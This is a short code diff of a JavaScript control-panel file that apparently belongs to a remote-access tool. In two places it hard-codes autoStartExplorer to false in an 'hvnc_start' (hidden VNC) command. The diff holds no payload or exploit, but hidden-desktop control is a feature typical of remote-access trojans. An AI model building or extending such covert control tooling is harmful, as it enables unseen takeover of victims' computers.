@@ -201,7 +201,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
           });
         }
         sendCmd("hvnc_start", {
-          autoStartExplorer: autoExplorerCtrl ? autoExplorerCtrl.checked : true,
+          autoStartExplorer: false,
         });
       } else {
         setStreamState("idle", "Stopped");
@@ -430,7 +430,7 @@ import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
     lastFrameAt = 0;
     setStreamState("starting", "Starting stream");
     sendCmd("hvnc_start", {
-      autoStartExplorer: autoExplorerCtrl ? autoExplorerCtrl.checked : true,
+      autoStartExplorer: false,
     });
   });
   stopBtn.addEventListener("click", function () {
